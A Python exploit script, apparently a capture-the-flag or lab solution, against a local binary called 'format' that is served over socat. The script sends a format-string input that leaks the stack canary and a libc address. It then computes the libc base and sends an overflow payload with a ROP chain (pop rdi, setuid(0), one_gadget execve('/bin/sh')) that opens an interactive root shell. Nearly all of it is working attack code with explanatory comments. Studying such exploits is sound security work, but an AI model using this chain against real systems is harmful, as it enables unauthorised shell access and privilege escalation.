from telnetlib import Telnet
from struct import pack
"""
Be careful with telnet. It doubles the '\xff' when sending payload. Use socket instead. And set that for telnet to interact.
p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect((ip,port))
p.send(__)
p.recv(__)
tn=Telnet()
tn.sock=p
tn.interact()
"""
p = lambda x : pack("<Q",x)				                        #To convert 64 bit addresses to little endian
print("Enter this command to setup a server. 5555 is port !")
print("\t$ socat tcp-listen:5555,fork, exec:'./format'\n")

ip = input("[i] Enter target ip (localhost): ")	                #ask target ip
if not ip:
	ip = 'localhost'				                            #default target ip
port = input("[i] Enter target port (5555): ")	                #ask target port
if not port:
	port = 5555					                                #default target port
print("[i] Connecting to server")
tn = Telnet(ip, port)					                        #connect to ip,port

print(tn.read_until('Name:'))				                    # Read until prompt for Name:
tn.write('%lx-'*15)					                            # Send format string as input to server
pre=tn.read_until('Code:')				                        # Read output until prompt for Code:. Output contains the leaked addresses
pre = pre.split('-')					                        # Split addreses by '-' into a list
print(pre)						                                # print the list
canary=int(pre[-2],16)					                        # The second last entry in list is canary value. Convert it into integer with base 16.
libc=int(pre[4],16)-0x161040				                    # The 4th address is from libc at offset 0x59e4c0. Convert the address to int with base 16 and subtract the offset to find libc base.
print("[+] Found Stack Canary   : " + hex(canary))	            # print canary in hex format
print("[+] Calculated Libc base : " + hex(libc))	            # print libc base in hex format

one_gadget=0xcda5a					                            # one gadget offset in libc to execve('/bin/sh',null,null);
pop_rdi=0x1228fa						                            # pop rdi; ret to store null byte in rdi for setuid
setuid=0xcdea0						                            # ret to setuid with 0x0 as argument from rdi
canary=p(canary)					                            # convert stack canary to little endian
one=p(libc+one_gadget)					                        # find address to onegadget in libc by adding libc base to offset and convert to little endian
pop=p(libc+pop_rdi)					                            # address of pop rdi; ret converted to little endian
setuid=p(libc+setuid)					                        # address of setuid
null=p(0x0)						                                # 8 null bytes for setuid.

payload='A'*136						                            # 136 bytes junk to reach stack canary
payload+=canary 					                            # overwrite stack canary with correct canary value
payload+='B'*8						                            # 8 bytes junk to reach return address
payload+=pop 						                            # jump to pop rdi; ret
payload+=null						                            # null to be popped to rdi
payload+=setuid						                            # then return to setuid
payload+=one 						                            # finally return to one gadget to execute execve('/bin/sh',null,null);

print("[i] Payload generated")
tn.write(payload+'\n')					                        # Enter payload into next prompt
print(tn.read_until('.'))				                        # Read until last '.'
print("[+] Shell ready. Enter commands !")
tn.write('id\n')					                            # Enter id command
tn.interact()	